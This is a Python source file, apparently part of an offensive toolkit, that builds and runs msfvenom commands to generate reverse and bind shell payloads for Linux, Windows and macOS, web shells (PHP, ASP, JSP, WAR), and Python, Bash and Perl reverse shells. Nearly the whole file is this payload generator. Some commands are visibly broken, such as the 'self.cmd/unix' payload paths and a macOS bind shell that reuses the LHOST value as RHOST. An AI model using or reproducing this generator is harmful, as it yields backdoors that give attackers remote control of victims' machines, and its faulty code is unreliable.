#!/usr/bin/python3

from assets.banners import pgen_banner
from assets.colors import *
from assets.designs import logo, author
from assets.prefixes import eagleshell_prefix, invalid_input_prefix, shell_prefix, os_prefix, payload_prefix, lhost_prefix, lport_prefix, rhost_prefix, name_prefix, output_prefix
from assets.properties import clear_screen
from assets.shortcuts import Exit
from .exploitation import Exploitation
import os


class PGen:
    def __init__(self):
        self.lhost_set = ''
        self.rhost_set = ''
        self.lport_set = ''
        self.output_set = ''
        self.name_set = ''
        self.name_output()

    def header(self):
        os.system(clear_screen)
        print(logo)
        print(pgen_banner)
        print(author)

    def name_output(self):
        try:
            self.header()
            print('Name and Output:')
            print('\n\t Paste Your Name and Output Folder')
            print('\n\t Example Name: MyShell')
            print('\t Example Output: /tmp/shells/')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            while True:
                self.name_set = input(name_prefix)
                if self.name_set == 'z' or self.name_set == 'Z':
                    Exploitation()
                elif self.name_set == 'x' or self.name_set == 'X':
                    Exit()
                self.output_set = input(output_prefix)
                if self.output_set == 'z' or self.output_set == 'Z':
                    Exploitation()
                elif self.output_set == 'x' or self.output_set == 'X':
                    Exit()
                self.payloads()
        except KeyboardInterrupt:
            Exit()

    def payloads(self):
        try:
            self.header()
            print('Payloads:')
            print('\n\t1): Binaries Payloads')
            print('\t2): Web Payloads')
            print('\t3): Scripting Payloads')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            while True:
                linux_shells_select = input(shell_prefix).lower()
                if linux_shells_select == '1':
                    self.os_binaries_payloads()
                elif linux_shells_select == '2':
                    self.web_payloads()
                elif linux_shells_select == '3':
                    self.scripting_payloads()
                elif linux_shells_select == 'z':
                    Exploitation()
                elif linux_shells_select == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()

    def os_binaries_payloads(self):
        try:
            self.header()
            print('OS:')
            print('\n\t1): Linux')
            print('\t2): Windows')
            print('\t3): Mac')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            while True:
                binaries_payloads_os_select = input(os_prefix).lower()
                if binaries_payloads_os_select == '1':
                    self.linux_binaries_payloads()
                elif binaries_payloads_os_select == '2':
                    self.windows_binaries_payloads()
                elif binaries_payloads_os_select == '3':
                    self.mac_binaries_payloads()
                elif binaries_payloads_os_select == 'z':
                    Exploitation()
                elif binaries_payloads_os_select == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()

    def linux_binaries_payloads(self):
        try:
            self.header()
            print('Payloads:')
            print('\n\tBinaries Payloads')
            print('\t----------------------------')
            print('\t1): Linux Meterpreter Reverse Shell')
            print('\t2): Linux Bind Meterpreter Shell')
            print('\t3): Linux Bind Shell')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            while True:
                linux_payloads_binaries_select = input(payload_prefix).lower()
                if linux_payloads_binaries_select == '1':
                    self.lhost_set = input(lhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'Linux Meterpreter Reverse Shell'
                    self.cmd = 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=' + self.lhost_set + ' LPORT=' + self.lport_set + ' -f elf -o ' + self.output_set + '/' + self.name_set + '.elf'
                    self.generatate()
                elif linux_payloads_binaries_select == '2':
                    self.rhost_set = input(rhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'Linux Bind Meterpreter Shell'
                    self.cmd = 'msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=' + self.rhost_set + ' LPORT=' + self.lport_set + ' -f elf -o ' + self.output_set + '/' + self.name_set + '.elf'
                    self.generatate()
                elif linux_payloads_binaries_select == '3':
                    self.rhost_set = input(rhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'Linux Bind Shell'
                    self.cmd = 'msfvenom -p generic/shell_bind_tcp RHOST=' + self.rhost_set + ' LPORT=' + self.lport_set + ' -f elf -o ' + self.output_set + '/' + self.name_set + '.elf'
                    self.generatate()
                elif linux_payloads_binaries_select == 'z':
                    Exploitation()
                elif linux_payloads_binaries_select == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()

    def windows_binaries_payloads(self):
        try:
            self.header()
            print('Payloads:')
            print('\n\tBinaries Payloads')
            print('\t----------------------------')
            print('\t1): Windows Meterpreter Reverse TCP Shell')
            print('\t2): Windows Reverse TCP Shell')
            print('\t3): Windows Encoded Meterpreter Windows Reverse Shell')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            while True:
                windows_payloads_binaries_select = input(payload_prefix).lower()
                if windows_payloads_binaries_select == '1':
                    self.lhost_set = input(lhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'Windows Meterpreter Reverse TCP Shell'
                    self.cmd = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + self.lhost_set + ' LPORT=' + self.lport_set + ' -f exe -o ' + self.output_set + '/' + self.name_set + '.exe'
                    self.generatate()
                elif windows_payloads_binaries_select == '2':
                    self.lhost_set = input(lhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'Windows Reverse TCP Shell'
                    self.cmd = 'msfvenom -p windows/shell/reverse_tcp LHOST=' + self.lhost_set + ' LPORT=' + self.lport_set + ' -f exe -o ' + self.output_set + '/' + self.name_set + '.exe'
                    self.generatate()
                elif windows_payloads_binaries_select == '3':
                    self.payload = 'Windows Encoded Meterpreter Windows Reverse Shell'
                    self.cmd = 'msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe -o ' + self.output_set + '/' + self.name_set + '.exe'
                    self.generatate()
                elif windows_payloads_binaries_select == 'z':
                    Exploitation()
                elif windows_payloads_binaries_select == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()

    def mac_binaries_payloads(self):
        try:
            self.header()
            print('Payloads:')
            print('\n\tBinaries Payloads')
            print('\t----------------------------')
            print('\t1): Mac Reverse Shell')
            print('\t2): Mac Bind Shell')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            while True:
                mac_payloads_binaries_select = input(payload_prefix).lower()
                if mac_payloads_binaries_select == '1':
                    self.lhost_set = input(lhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'Mac Reverse Shell'
                    self.cmd = 'msfvenom -p osx/x86/shell_reverse_tcp LHOST=' + self.lhost_set + ' LPORT=' + self.lport_set + ' -f macho -o ' + self.output_set + '/' + self.name_set + '.macho'
                    self.generatate()
                elif mac_payloads_binaries_select == '2':
                    self.lhost_set = input(lhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'Mac Bind Shell'
                    self.cmd = 'msfvenom -p osx/x86/shell_bind_tcp RHOST=' + self.lhost_set + ' LPORT=' + self.lport_set + ' -f macho -o ' + self.output_set + '/' + self.name_set + '.macho'
                    self.generatate()
                elif mac_payloads_binaries_select == 'z':
                    Exploitation()
                elif mac_payloads_binaries_select == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()

    def web_payloads(self):
        try:
            self.header()
            print('Payloads:')
            print('\n\tWeb Payloads')
            print('\t----------------------------')
            print('\t1): PHP Meterpreter Reverse TCP')
            print('\t2): ASP Meterpreter Reverse TCP')
            print('\t3): JSP Java Meterpreter Reverse TCP')
            print('\t4): WAR')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            while True:
                web_payloads_select = input(payload_prefix).lower()
                if web_payloads_select == '1':
                    self.lhost_set = input(lhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'PHP Meterpreter Reverse TCP'
                    self.cmd = 'msfvenom -p php/meterpreter_reverse_tcp LHOST=' + self.lhost_set + ' LPORT=' + self.lport_set + ' -f raw -o ' + self.output_set + '/' + self.name_set + '.php'
                    self.generatate()
                elif web_payloads_select == '2':
                    self.lhost_set = input(lhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'ASP Meterpreter Reverse TCP'
                    self.cmd = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + self.lhost_set + ' LPORT=' + self.lport_set + ' -f asp -o ' + self.output_set + '/' + self.name_set + '.asp'
                    self.generatate()
                elif web_payloads_select == '3':
                    self.lhost_set = input(lhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'JSP Java Meterpreter Reverse TCP'
                    self.cmd = 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=' + self.lhost_set + ' LPORT=' + self.lport_set + ' -f raw -o ' + self.output_set + '/' + self.name_set + '.jsp'
                    self.generatate()
                elif web_payloads_select == '4':
                    self.lhost_set = input(lhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'WAR'
                    self.cmd = 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=' + self.lhost_set + ' LPORT=' + self.lport_set + ' -f war -o ' + self.output_set + '/' + self.name_set + '.war'
                    self.generatate()
                elif web_payloads_select == 'z':
                    Exploitation()
                elif web_payloads_select == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()

    def scripting_payloads(self):
        try:
            self.header()
            print('Payloads:')
            print('\n\tScripting Payloads')
            print('\t----------------------------')
            print('\t1): Python Reverse Shell')
            print('\t2): Bash Unix Reverse Shell')
            print('\t3): Perl Unix Reverse shell')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            while True:
                scripting_payloads_select = input(payload_prefix).lower()
                if scripting_payloads_select == '1':
                    self.lhost_set = input(lhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'Python Reverse Shell'
                    self.cmd = 'msfvenom -p self.cmd/unix/reverse_python LHOST=' + self.lhost_set + ' LPORT=' + self.lport_set + ' -f raw -o ' + self.output_set + '/' + self.name_set + '.py'
                    self.generatate()
                elif scripting_payloads_select == '2':
                    self.lhost_set = input(lhost_prefix).lower()
                    self.lport_set = input(lport_prefix).lower()
                    self.payload = 'Bash Unix Reverse Shell'
                    self.cmd = 'msfvenom -p self.cmd/unix/reverse_bash LHOST=' + self.lhost_set + ' LPORT=' + self.lport_set + ' -f raw -o ' + self.output_set + '/' + self.name_set + '.sh'
                    self.generatate()
                elif scripting_payloads_select == '3':
                    self.payload = 'Perl Unix Reverse shell'
                    self.cmd = 'msfvenom -p self.cmd/unix/reverse_perl LHOST=' + self.lhost_set + ' LPORT=' + self.lport_set + ' -f raw -o ' + self.output_set + '/' + self.name_set + '.pl'
                    self.generatate()
                elif scripting_payloads_select == 'z':
                    Exploitation()
                elif scripting_payloads_select == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()

    def generatate(self):
        print(GREEN + '\n[+] Generating Payload. Please Wait...' + WHITE)
        os.system(self.cmd + '>/dev/null 2>&1')
        self.result()

    def result(self):
        try:
            self.header()
            print('Output:')
            print('\n\tPAYLOAD: ' + GREEN + self.payload + WHITE)
            if len(self.lhost_set) >= 1:
                print('\tLHOST: ' + GREEN + self.lhost_set + WHITE)
            elif len(self.rhost_set) >= 1:
                print('\tRHOST: ' + GREEN + self.rhost_set + WHITE)
            else:
                pass
            if len(self.lport_set) >= 1:
                print('\tLPORT: ' + GREEN + self.lport_set + WHITE)
            else:
                pass
            print('\n\tOUTPUT: ' + GREEN + self.output_set + '/' + self.name_set + WHITE)
            print('\n\tY): New')
            print('\tZ): Menu')
            print('\tX): Exit\n')
            while True:
                self.cmd = input(eagleshell_prefix).lower()
                if self.cmd == 'y':
                    PGen()
                elif self.cmd == 'z':
                    Exploitation()
                elif self.cmd == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()
